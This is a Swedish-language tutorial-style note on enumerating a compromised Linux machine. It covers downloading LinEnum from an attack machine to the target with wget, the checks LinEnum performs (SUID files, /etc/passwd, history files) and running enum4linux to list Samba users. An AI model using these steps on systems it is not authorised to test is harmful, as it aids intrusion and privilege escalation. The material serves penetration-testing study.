# Kartläggning av ett system för att få reda på vad som går att utnyttja
### LinEnum
Det finns ett skript man kan köra på en burk man fått tillgång till för att ta reda på intressanta svagheter som går att utnyttja. Filen kan laddas ner här: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh.

Ett sätt att få ner den till maskinen är att på sin attack-maskin starta en webserver från den katalog där skriptet ligger med kommandot `python3 -m http.server 8000` och sen från den angripna servern köra `wget [attack-maskinens-ip]:8000/LinEnum.sh; chmod +x LinEnum.sh`.

När man kör skriptet så listar den flera intressanta saker såsåom
* Information om kernel
* Känsliga filer som är läs eller skrivbara
* SUID-filer. Detta är filer som kan utnyttjas för att höja privilegierna. De tar helt enkelt rättigheterna för den som exekverar filen.
* Crontab
* Vilka skal som finns tillgängliga
* Vilka tjänster som finns installerade
* Vilka processer som körs

Detta är en sammanställning av allt det letar efter
``` bash
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled
### SYSTEM ##############################################
[-] Kernel information:
[-] Kernel information (continued):
[-] Specific release information:
[-] Hostname:
### USER/GROUP ##########################################
[-] Current user/group info:
[-] Users that have previously logged onto the system:
[-] Who else is logged on:
[-] Group memberships:
[-] It looks like we have some admin users:
[-] Contents of /etc/passwd:
[-] Super user account(s):
[-] Are permissions on /home directories lax:
### ENVIRONMENTAL #######################################
[-] Environment information:
[-] SELinux seems to be present:
[-] Path information:
[-] Available shells:
[-] Current umask value:
[-] umask value as specified in /etc/login.defs:
[-] Password and storage information:
### JOBS/TASKS ##########################################
[-] Cron jobs:
[-] Crontab contents:
[-] Anacron jobs and associated file permissions:
[-] When were jobs last executed (/var/spool/anacron contents):
[-] Systemd timers:
### NETWORKING  ##########################################
[-] Network and IP info:
[-] ARP history:
[-] Nameserver(s):
[-] Default route:
[-] Listening TCP:
[-] Listening UDP:
### SERVICES #############################################
[-] Running processes:
[-] Process binaries and associated permissions (from above list):
[-] /etc/init.d/ binary permissions:
[-] /etc/rc.d/init.d binary permissions:
[-] /lib/systemd/* config file permissions:
### SOFTWARE #############################################
[-] Sudo version:
[-] Apache version:
[-] Installed Apache modules:
### INTERESTING FILES ####################################
[-] Useful file locations:
[-] Can we read/write sensitive files:
[-] SUID files:
[-] SGID files:
[-] NFS config details: 
[-] All *.conf files in /etc (recursive 1 level):
[-] Current user's history files:
[-] Location and contents (if accessible) of .bash_history file(s):
[-] Location and Permissions (if accessible) of .bak file(s):
[-] Any interesting mail in /var/mail:
[-] Anything juicy in the Dockerfile:
[-] Anything juicy in docker-compose.yml:
### SCAN COMPLETE ####################################

```
## enum4linux
Enum4linux enumererar samba för att kartlägga användare. Kör det med följande
``` bash
enum4linux -a <IP>
```
Den kan då t.ex. returnera nåt sånt här
``` bash
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                              
                                                                                                                                                                                                         
S-1-22-1-1000 Unix User\kay (Local User)                                                                                                                                                                 
S-1-22-1-1001 Unix User\jan (Local User)

```